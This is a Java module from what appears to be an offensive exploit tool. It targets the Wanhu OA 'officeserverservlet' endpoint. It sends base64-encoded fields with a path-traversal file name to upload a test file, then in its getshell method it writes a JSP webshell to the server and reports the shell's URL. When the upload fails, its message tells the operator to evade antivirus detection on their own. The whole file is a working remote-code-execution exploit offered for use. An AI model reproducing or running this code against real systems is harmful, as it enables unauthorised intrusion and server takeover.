package exp.oa.wanhuoa;

import core.Exploitlnterface;
import java.util.HashMap;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

public class wanhuoa_Officeserverservlet implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url,textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return shell(url, textArea);
    }


    private Boolean att(String url, TextArea textArea) {
        Response response = HttpTools.get(url + "/defaultroot/officeserverservlet", new HashMap<String, String>(), "utf-8");
        HashMap<String,String> head = new HashMap();
        head.put("Content-type","application/octet-stream");
        if (response.getCode() == 200) {
            String post = "DBSTEP V3.0     180             0               1000             DBSTEP=REJTVEVQ\r\n" +
                    "OPTION=U0FWRUZJTEU=\r\n" +
                    "RECORDID=\r\n" +
                    "isDoc=dHJ1ZQ==\r\n" +
                    "moduleType=Z292ZG9jdW1lbnQ=\r\n" +
                    "FILETYPE=Li4vLi4vdXBsb2FkL2h0bWwvbmlzaGl6aHUudHh0\r\n" +
                    "111111111111111111111111111111111111111111111111\r\n" +
                    shell.readFile(shell.Testpath);

            HttpTools.post(url + "/defaultroot/officeserverservlet", post,head ,"utf-8");

            Response response1 = HttpTools.get(url + "/defaultroot/upload/html/nishizhu.txt", new HashMap<String, String>(), "utf-8");
            if (response1.getCode() == 200 && response1.getText().contains(shell.test_payload)) {
                Platform.runLater(()->{
                  textArea.appendText("\n");
                  textArea.appendText("漏洞存在 测试文件已写入 \n " + url + "/defaultroot/upload/html/nishizhu.txt");
                });
                return true;
            } else {
               Platform.runLater(()->{
                  textArea.appendText("\n");
                  textArea.appendText("wanhuoa_OfficeServerservlet-RCE-漏洞不存在 (出现误报请联系作者)");
               });
                return false;
            }
        } else {
            Platform.runLater(()->{
              textArea.appendText("\n");
              textArea.appendText("wanhuoa_OfficeServerservlet-RCE-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }
    }

    private Boolean shell(String url, TextArea textArea) {
        HashMap<String,String> head = new HashMap();
        head.put("Content-type","application/octet-stream");
        String post = "DBSTEP V3.0     180              0                5000              DBSTEP=REJTVEVQ\r\n" +
                "OPTION=U0FWRUZJTEU=\r\n" +
                "RECORDID=\r\n" +
                "isDoc=dHJ1ZQ==\r\n" +
                "moduleType=Z292ZG9jdW1lbnQ=\r\n" +
                "FILETYPE=Li4vLi4vdXBsb2FkL2h0bWwvbmlzaGl6aHUuanNw\r\n" +
                "111111111111111111111111111111111111111111111111\r\n" +
                shell.readFile(shell.Jsppath);

        HttpTools.post(url + "/defaultroot/officeserverservlet", post, head, "utf-8");

        Response response1 = HttpTools.get(url + "/defaultroot/upload/html/nishizhu.jsp", new HashMap<String, String>(), "utf-8");
        if (response1.getCode() == 200 && response1.getText().contains(shell.test_payload)) {
            textArea.appendText("\n 漏洞存在 webshell已写入 \n " + url + "/defaultroot/upload/html/nishizhu.jsp");
            return true;
        } else {
            textArea.appendText("\n webshell被查杀，请自行免杀");
            return false;
        }
    }
}
